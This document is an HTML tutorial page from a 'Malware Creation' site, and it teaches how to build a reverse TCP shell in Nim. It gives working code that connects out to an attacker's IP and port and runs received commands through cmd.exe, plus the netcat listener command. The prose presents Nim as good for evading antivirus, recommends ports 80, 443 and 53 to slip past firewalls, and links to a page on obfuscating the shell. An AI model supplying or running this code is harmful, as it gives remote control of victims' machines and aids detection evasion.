<!DOCTYPE html>
<html lang="en-US">

<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="stylesheet" href="style.css" />

    <title>
        Nim Reverse Shell
    </title>
</head>

<body>
    <header>
        <div class="container">
            <a id="a-title" href="home.html">
                <h1>Malware Creation</h1>
            </a>
            <h2>Nim Reverse TCP Shell</h2>
        </div>
    </header>

    <div class="container">
        <section id="main_content">
            <h1>Nim Shell:</h1>
            <p>
                As part of my Malware Creation Project, I developed a reverse shell in the programming language Nim. Nim is known for its lightweight syntax and compile-time optimizations, making it an ideal choice for developing stealthy and efficient code. In addition
                to its usefulness in creating malware, learning Nim can be a valuable skill for any programmer. Nim is a versatile language that can be used for a wide range of applications. By exploring Nim and its features, you can effectively learn
                to write code that would normally need an understanding of C/C++ in a style that is closer to python.
            </p>

            <h1>Why Nim:</h1>
            <p>
                One of the main reasons to use Nim is its lightweight syntax, which makes it easy to read and write. Nim's syntax is designed to be similar to Python, with a focus on simplicity and readability. This makes it a great choice for beginners who are just
                learning to code or for experienced programmers who want to write code quickly and efficiently.
            </p>
            <h3><a href="installingnim.html">Install Nim</a></h3>
            <p>
                One of the key advantages of using Nim to create malware is its ability to dynamically resolve all Windows API calls at runtime. This means that the Nim code does not rely on any external libraries or DLLs, making it harder to detect by antivirus software
                and other security measures. By resolving all API calls at runtime, the malware avoids leaving any traces that can be detected by antivirus software or other security measures. This feature provides an extra layer of protection against
                detection and makes Nim an attractive option for creating stealthy and effective malware.
            </p>
            <h1>What is a shell</h1>
            <p>
                In the context of malware, a "shell" is a type of command-line interface that allows an attacker to interact with an infected computer. This interface lets the attacker run commands and do things like steal data, install more malware, or change system
                settings.
            </p>

            <p>
                There are two kinds of shells: reverse and bind. A reverse shell starts on the infected computer and connects back to the attacker's computer to give them control. This is helpful when the attacker can't connect directly to the infected system. A bind
                shell is started on the attacker's computer and waits for the infected computer to connect to it. This is useful when the attacker has access to the infected computer or has taken control of a computer on the same network.
            </p>

            <p>
                It is often easier to implement a reverse shell so this is the kind of shell that is being used. The reverse shell makes use of the net, osproc modules of nim. This provides a very simple way of creating a connection over tcp sockets. Initiating the TCP
                socket is as simple as this code.
            </p>
            <pre><code>import net, osproc, strformat  # <-- strformat used later

let
  ip = "172.20.243.239" # <-- Change this to your listener's IP
  port = 1234          # <-- Change this to your listener's PORT
  sock = newSocket()

sock.connect(ip, Port(port))
            </code></pre>

            <h1>Listening for Shell</h1>
            <p>
                This will try and connect back to a computer at the ip and port that are listener is on. To Listen to this connection we must use a program called NetCat. NetCat comes on most linux installs and can be installed on windows as well. Follow this How To
                Guide to <a href="howtoguide.html#kali"> kali on
                    windows using WSL2.</a>
                <br>To Use the correct IP for the TCP Socket you must find the IP of the listener(in this case Kali WSL2). This is done on linux using commands:
                <pre><code>ifconfig</code></pre> or on windows
                <pre><code>ipconfig</code></pre> command
            </p>
            <p>This will return something like this:</p>
            <img src="img/ifconfig.png" style="border: 1px solid #cdfeaa; margin-left: 1em;">
            <p>
                In this case the IP address to put into the <b>Nim code</b> is 172.24.95.17 , the port does not really matter but often malware authors use common ports such as port 80, 443 and 53. This is because other legit programs use these ports
                and therefore are often allocated as outgoing ports in the firewall.
            </p>
            <h2>Using NetCat:</h2>
            <p>Using NetCat is simple. All that is needed is a command to tell the program to listen for a connection on a certain port and then let it wait.</p>
            <p>To Begin Listening on port 1234 use this command:</p>
            <code><pre>nc -nvlp 1234</pre></code>
            <p>
                Here is what each part of the command means:
            </p>
            <p>Here's what each part of the command means:

                <ul>
                    <li> -n option tells netcat not to perform DNS resolution for the incoming connections, using IP addresses
                    </li>
                    instead.

                    <li>-v option enables verbose output, providing more information about the connections as they are made.
                    </li>

                    <li>-l option instructs netcat to operate in listen mode, waiting for incoming connections.</li>

                    <li>-p 1234 option specifies the port number to listen on, in this case 1234.</li>
                </ul>
                So, when this command is run, the netcat server will start listening on port 1234, and any incoming connections to this port will be accepted. If a connection is made, the netcat server will display information about the connection, such as the IP address
                and port of the client, and will allow data to be exchanged between the client and server.</p>

            <h1>Finishing the Reverse Shell:</h1>
            <p>
                At the moment, the compiled version of our Nim program can establish a connection with netcat. However, any data that is sent to the program is received but not stored, executed or acted upon in any way. In order to change this behavior, we need to add
                more functionality to our Nim program.
            </p>
            <p>
                The functionality we will add is to make it run commands on the client (infected) PC. <br> This is the code:
            </p>
            <code><pre>let prompt = "Nim-Shell> "
while true:
  send(sock, prompt)
  let bad = recvLine(sock)
  let cmd = execProcess(fmt"cmd.exe /C " & bad) # <-- Can work on Linux/Unix if changed to bash command
  send(sock, cmd)</pre></code>
            <p>
                This is an explanation of each line of code:
                <ul>
                    <li><b>while true:</b> loop runs continuously and ensures that the connection is kept alive between the attacker and the infected computer.</li>

                    <li><b>send(sock, prompt)</b> line sends a prompt message to the attacker's computer through the established connection. The prompt message is then displayed on the attacker's terminal, indicating that they can now send commands to the
                        infected computer.</li>

                    <li><b>let bad = recvLine(sock)</b> line receives a command from the attacker's terminal through the same connection. The command is stored in the variable bad.</li>

                    <li><b>let cmd = execProcess(fmt"cmd.exe /C " & bad)</b> line executes the command received from the attacker using the cmd.exe program on the infected computer. The fmt function is used to format the command string into a format that
                        is suitable for execution using cmd.exe.</li>

                    <li><b>send(sock, cmd)</b> line sends the output of the executed command back to the attacker's terminal through the established connection. The attacker can then see the results of their command on their own terminal.
                    </li>
                </ul>
            </p>
            <h1>Running the Reverse Shell</h1>
            <p>
                Compile and run the source code by typing
                <pre><code>nim c -r ./nimshell.nim</code></pre>
                <br>This will the start the program and it will call out to the IP and port of our listening NetCat instance. When it connects to it given that the IP and Port are correct; the netcat will then show a connection and have a prompt that
                looks like this:
                <pre style="border: 1px solid #cdfeaa; margin-left: 3em; margin-right: 3em;"><code>Nim-Shell> </code></pre> You can then type a command into it and press enter. Everything that is typed is then executed on the PC that the NimShell is running.
                This is a basic shell and will be detected by antivirus. <a href="obfuscatingnimshell.html">To get around this is when it gets fun.</a>
            </p>
        </section>
    </div>
    <hr>
    <footer>
        <nav>
            <a href="index.html" class="footer-link" id="bottom-link-alt">Home</a>
            <a href="developmentsetup.html" class="footer-link" id="bottom-link">Development and Testing Setup</a>
            <a href="antivirusfactfile.html" class="footer-link" id="bottom-link">Antivirus Fact File</a>
            <a href="WindowsAPl.html" class="footer-link" id="bottom-link-alt">Windows API</a>
            <a href="processesthreadshandles.html" class="footer-link" id="bottom-link-alt">Processes, Threads, and Handles</a>
            <a href="processinjection.html" class="footer-link" id="bottom-link">Process Injection</a>
            <a href="Dynamiclmports.html" class="footer-link" id="bottom-link">Dynamic Imports</a>
            <a href="installingnim.html" class="footer-link" id="bottom-link-alt">Installing Nim</a>
            <a href="basicnimshell.html" class="footer-link" id="bottom-link-alt">Basic Nim Shell</a>
            <a href="obfuscatingnimshell.html" class="footer-link" id="bottom-link">Obfuscating Nim Shell</a>
            <a href="customencoder.html" class="footer-link" id="bottom-link">Custom Encoder</a>
            <a href="Nimjector.html" class="footer-link" id="bottom-link-alt">Custom Modular Malware</a>
        </nav>
    </footer>
</body>

</html>